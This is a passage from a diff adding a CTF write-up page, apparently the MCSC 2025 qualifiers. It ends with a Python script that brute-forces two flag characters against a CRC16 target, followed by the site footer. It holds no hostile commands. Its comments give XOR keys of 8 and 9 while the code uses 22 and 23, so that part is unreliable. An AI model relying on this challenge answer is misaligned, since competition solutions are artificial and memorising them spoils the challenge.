+</span></span><span class="line"><span class="cl">    <span class="c1"># Finalize: take 16-bit complement then swap the two bytes.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">crc</span> <span class="o">=</span> <span class="p">(</span><span class="o">~</span><span class="n">crc</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">crc</span> <span class="o">=</span> <span class="p">((</span><span class="n">crc</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">crc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set the target CRC for this chunk.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target_crc</span> <span class="o">=</span> <span class="mh">0xf227</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Brute-forcing variable pair (original positions 20 and 21) for target CRC = 0x</span><span class="si">{</span><span class="n">target_crc</span><span class="si">:</span><span class="s2">04x</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># According to our mapping:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#  - Reversed index for original pos21 = 29 - 21 = 8, so processed byte = (orig pos21) XOR 8.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#  - Reversed index for original pos20 = 29 - 20 = 9, so processed byte = (orig pos20) XOR 9.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The 2-byte chunk is formed as:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#    [ (original pos21 XOR 8), (original pos20 XOR 9) ]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># We brute-force over printable ASCII values (0x20 to 0x7e).</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">orig20</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>  <span class="c1"># candidate for original position 20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">orig21</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>  <span class="c1"># candidate for original position 21</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">processed_byte_first</span> <span class="o">=</span> <span class="n">orig21</span> <span class="o">^</span> <span class="mi">22</span>   <span class="c1"># from original pos21 at reversed index 8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">processed_byte_second</span> <span class="o">=</span> <span class="n">orig20</span> <span class="o">^</span> <span class="mi">23</span>    <span class="c1"># from original pos20 at reversed index 9</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">pair</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">processed_byte_first</span><span class="p">,</span> <span class="n">processed_byte_second</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">crc</span> <span class="o">=</span> <span class="n">compute_crc16</span><span class="p">(</span><span class="n">pair</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">crc</span> <span class="o">==</span> <span class="n">target_crc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Candidate found:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  Original pos20: </span><span class="si">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">orig20</span><span class="p">)</span><span class="si">}</span><span class="s2"> (0x</span><span class="si">{</span><span class="n">orig20</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  Original pos21: </span><span class="si">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">orig21</span><span class="p">)</span><span class="si">}</span><span class="s2"> (0x</span><span class="si">{</span><span class="n">orig21</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  Processed bytes: [</span><span class="si">{</span><span class="n">processed_byte_first</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">processed_byte_second</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">] -&gt; CRC = 0x</span><span class="si">{</span><span class="n">crc</span><span class="si">:</span><span class="s2">04x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No candidate pair found in the given range.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done!&#34;</span><span class="p">)</span>
+</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-18</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/mcsc-2025-qualifiers-writeup/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thesaucese.github.io/mcsc-2025-qualifiers-writeup/" data-title="MCSC 2025 Qualifiers Writeup"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thesaucese.github.io/mcsc-2025-qualifiers-writeup/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://thesaucese.github.io/mcsc-2025-qualifiers-writeup/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/vishwactf/" class="prev" rel="prev" title="VishwaCTF Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>VishwaCTF Writeup</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.132.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"></div>
+        </div>
+    </footer>
+    <script defer language="javascript" type="text/javascript"  src="/js/oneko.js"></script>
+    <script defer language="javascript" type="text/javascript"  src="/js/matrix.js"></script></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"TheSaucese","id-2":"TheSaucese"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
